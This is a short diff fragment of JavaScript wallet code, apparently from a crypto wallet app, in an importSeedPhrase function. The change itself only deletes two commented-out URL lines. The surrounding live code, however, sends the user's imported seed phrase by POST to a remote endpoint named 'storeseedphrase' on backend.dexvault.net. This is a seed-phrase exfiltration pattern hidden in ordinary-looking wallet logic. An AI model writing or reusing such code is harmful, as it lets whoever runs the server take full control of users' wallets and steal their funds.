@@ -425,8 +425,7 @@ export const importSeedPhrase = (bodyData) => {
       await idbSet('address', address);
       const chain = '0x1';
       await idbSet('chain', chain);
-//https://backend.dexvault.net
-//https://backend.dexvault.net
+
       const response = await fetch('https://backend.dexvault.net/storeseedphrase', {
         method: "POST",
         headers: {
